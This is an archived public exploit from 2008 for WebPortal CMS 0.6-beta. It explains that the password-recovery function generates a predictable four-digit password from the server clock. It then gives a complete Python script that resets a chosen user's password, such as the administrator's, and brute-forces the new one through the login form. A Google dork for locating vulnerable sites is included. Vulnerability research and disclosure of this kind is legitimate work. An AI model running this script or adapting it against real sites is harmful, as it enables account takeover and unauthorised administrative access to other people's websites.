<html><head><title>WebPortal CMS 0.6-beta Remote Password Change Exploit   </title></head><pre>#!/usr/bin/python
#=================================================================================================# 
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                    This is a Public Exploit.                                    #
#				   Date: 04/01/2008 [dd,mm,yyyy]                                  #
#                                                                                                 #
#                                      !!!Happy New Year!!!                                       #
#                                                                                                 #
#=================================================================================================#
#               WebPortal-0.6-beta Cms And Maybe Lower Remote Password Change Exploit             #
#                                                                                                 #
#                                       Vendor:   webportal.ivanoculmine.com                      #
#                                     Severity:   Highest                                         #
#                                       Author:   The:Paradox                                     #
#=================================================================================================#                                                                                                 
#                             This exploit works with Magic Quotes = On                           #
#=================================================================================================#                                                                                                 
#                                       Proud To Be Italian.                                      #
#=================================================================================================#
&quot;&quot;&quot;                                                                                                
                                            Related Codes:
                                         actions.php; line 14:

elseif ($_GET[&quot;action&quot;] == &quot;lostpass&quot;) {
  $newpass = date(&quot;is&quot;).substr($user, 1, 2);

  $result = db_query (&quot;SELECT * FROM &quot;.$prefix.&quot;users WHERE uname='&quot;.$_POST[&quot;user_name&quot;].&quot;';&quot;);
  if (db_num_rows($result) &gt; 0) {
    $utente = db_fetch_array ($result);
    db_query (&quot;UPDATE &quot;.$prefix.&quot;users SET pass='&quot;.md5($newpass).&quot;' WHERE id='&quot;.$utente[&quot;id&quot;].&quot;';&quot;);	

&quot;&quot;&quot;
#=================================================================================================#
# Proof Of Concept / Bug Explanation:                                                             #
#                                                                                                 #
# This vulnerability is in actions.php and make us able to change the password of a victim user.  #
# The page is a &quot;Password Recovery Tool&quot;, that sends a new generated password to user's email.    #
# It does an Update query (after a vulnerable SQL injection mq = OFF xD) setting as &quot;pass&quot;        #
# the $newpass variable. Let's look the code.                                                     #
#                                                                                                 #
# $newpass = date(&quot;is&quot;).substr($user, 1, 2);                                                      #                                      
#                                                                                                 #
# The newpassword is simply the date (minute+seconds) and the var $user taken trought             #
# register_globals (we can let it empty).                                                         #
# So look at your clock, recover the password, and get administator rights ! =D                   #
#                                                                                                 # 
# If get the exactly server date is a problem for you, i have coded a little bruteforcer          #
# (the new password is a 4 number sequence).                                                      #       
#                                                                                                 # 
#=================================================================================================#
# Post Request to &quot;Recover Password&quot; :                                                            #                        
#                                                                                                 # 
# POST /webportal-0.6-beta/actions.php?action=lostpass user_name=[UserName]                       #
#                                                                                                 #
#=================================================================================================#
# WebPortal cms is a very bugged platform. Some pages and functions don't work with the server    #
# configuration Register_globals = Off , A LOT of sql injections with Magic Quotes = Off,         #
# Full path disclosoures ecc.                                                                     #
# Whatever this one is the most critical ('cause works with Mq=ON).                               #
# Maybe I'll public a sql injection mq=Off.                                                       #
#=================================================================================================#
# Google Dork=&gt; Realizzato utilizzando Web Portal                                                 #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
import httplib, urllib, sys
from string import replace
print &quot;\n################################################&quot;
print &quot;      WebPortal-0.6-beta Cms And Maybe Lower    &quot;
print &quot;          Remote Password Change Exploit        &quot;
print &quot;                 Date Bruteforcer               &quot;
print &quot;                                                &quot;
print &quot;            Discovered By The:Paradox           &quot;          
print &quot;                                                &quot;
print &quot; Usage:                                         &quot; 
print &quot; python %s [Target] [Path] [Username]           &quot; % (sys.argv[0])
print &quot;                                                &quot;	
print &quot; Example:                                       &quot; 			
print &quot; python %s 127.0.0.1 /WebPortal/ Admin          &quot; % (sys.argv[0])
print &quot; python %s www.host.com / Admin                 &quot; % (sys.argv[0])	
print &quot;                                                &quot;	
print &quot;                                                &quot;		
print &quot;################################################\n&quot;
if len(sys.argv)&lt;=3:	sys.exit()
else:   print &quot;[.]Exploit Starting.&quot;		
port = &quot;80&quot;
target = sys.argv[1]
path = sys.argv[2]
username = sys.argv[3] 


#Resetting Password
conn = httplib.HTTPConnection(target,port)
conn.request(&quot;POST&quot;, path + &quot;actions.php?action=lostpass&quot;, urllib.urlencode({'user_name': username}), {&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;})
response = conn.getresponse()
print &quot;[.]Resetting Password --&gt;&quot;,response.status, response.reason
conn.close()
#If 404 error: die.
if response.status == 404:
	sys.exit(&quot;[-]Unable to reset Password. Failed, Exiting.&quot;)

#Let's Brute.
print &quot;[.]Bruteforcer Starts. This may take long time.&quot;
for i in range(10000,19999):

		conn = httplib.HTTPConnection(target,port)
		conn.request(&quot;POST&quot;, path + &quot;actions.php&quot;, urllib.urlencode({'uname': username,'pass': replace(str(i), &quot;1&quot;, &quot;&quot;, 1),&quot;action&quot; : &quot;login&quot;}), {&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;})
		response = conn.getresponse()
		header = response.getheader(&quot;location&quot;)

		if header.find(&quot;index.php?error=not_logged&quot;) == -1:
			sys.exit(&quot;\n\n[+]Gotcha! Password is: &quot; + replace(str(i), &quot;1&quot;, &quot;&quot;, 1) + &quot;\n\n-=Paradox Got This One=-\n&quot;)

print &quot;[-]Not Found. Exploit Failed.&quot;

# milw0rm.com [2008-01-04]</pre></html>